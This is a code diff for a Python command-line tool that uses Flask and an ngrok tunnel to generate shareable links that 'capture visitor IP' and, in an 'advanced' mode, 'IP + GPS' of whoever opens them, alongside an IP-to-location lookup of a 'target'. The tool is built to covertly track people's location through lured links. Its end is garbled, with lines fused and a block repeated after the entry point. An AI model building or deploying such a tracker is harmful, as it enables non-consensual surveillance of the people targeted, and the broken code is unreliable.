@@ -125,17 +125,22 @@ def start_ngrok(subdomain=""):
     os.system(f"./ngrok authtoken {token}")
     cmd = ["./ngrok", "http", "5000"]
     if subdomain:
-        cmd.append(f"--subdomain={subdomain}")
+        cmd.extend(["--region=us", f"--subdomain={subdomain}"])
     print("\033[93m[•] Starting Ngrok tunnel...\033[0m")
     ngrok_process = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.STDOUT)
     time.sleep(5)
     try:
-        tunnels = requests.get("http://localhost:4040/api/tunnels").json()
-        public_url = tunnels['tunnels'][0]['public_url']
+        res = requests.get("http://localhost:4040/api/tunnels").json()
+        tunnels = res.get("tunnels", [])
+        if not tunnels:
+            raise Exception("Ngrok tunnel not found. Did it start correctly?")
+        public_url = tunnels[0]["public_url"]
         print(f"\033[92m[✓] Ngrok tunnel started: {public_url}\033[0m")
+        return ngrok_process, public_url
     except Exception as e:
         print(f"\033[91m[✗] Failed to get ngrok URL: {e}\033[0m")
-    return ngrok_process
+        ngrok_process.terminate()
+        return None, None
 
 def run_flask():
     app.run(host="0.0.0.0", port=5000)
@@ -143,6 +148,67 @@ def run_flask():
 def ip_lookup():
     ip = input("Enter target IP address: ").strip()
     data = get_location(ip)
+    print("\n\033[96m--- IP Info ---\033[0m")
+    for k, v in data.items():
+        print(f"{k}: {v}")
+    print("\033[96m----------------\033[0m")
+
+def generate_link():
+    subdomain = input("Enter desired ngrok subdomain (or leave blank for random): ").strip()
+    ngrok_process, public_url = start_ngrok(subdomain)
+    if not public_url:
+        return
+    flask_thread = Thread(target=run_flask)
+    flask_thread.start()
+    print("\033[93m[•] Flask app running on http://0.0.0.0:5000/\033[0m")
+    print(f"\033[92m[✓] Share this link to capture basic visitor IP: {public_url}\033[0m")
+    try:
+        while flask_thread.is_alive():
+            time.sleep(1)
+    except KeyboardInterrupt:
+        print("\nExiting and terminating ngrok...")
+        ngrok_process.terminate()
+        flask_thread.join()
+
+def immediate_ip_gps_option():
+    subdomain = input("Enter desired ngrok subdomain (or leave blank for random): ").strip()
+    ngrok_process, public_url = start_ngrok(subdomain)
+    if not public_url:
+        return
+    full_url = public_url + "/immediate"
+    flask_thread = Thread(target=run_flask)
+    flask_thread.start()
+    print(f"\033[92m[✓] Share this link to capture IP + GPS: {full_url}\033[0m")
+    try:
+        while flask_thread.is_alive():
+            time.sleep(1)
+    except KeyboardInterrupt:
+        print("\nExiting and terminating ngrok...")
+        ngrok_process.terminate()
+        flask_thread.join()
+
+def menu():
+    banner()
+    while True:
+        print("\n\033[93m[1]\033[0m Track location using IP")
+        print("\033[93m[2]\033[0m Generate link & capture visitor IP (basic page)")
+        print("\033[93m[3]\033[0m Generate link & capture visitor IP immediately + GPS (advanced)")
+        print("\033[93m[0]\033[0m Exit")
+        choice = input("Select an option: ").strip()
+        if choice == '1':
+            ip_lookup()
+        elif choice == '2':
+            generate_link()
+        elif choice == '3':
+            immediate_ip_gps_option()
+        elif choice == '0':
+            print("Exiting...")
+            break
+        else:
+            print("Invalid option.")
+
+if __name__ == '__main__':
+    menu()    data = get_location(ip)
     print("\n\033[96m--- IP Info ---\033[0m")
     for k, v in data.items():
         print(f"{k}: {v}")
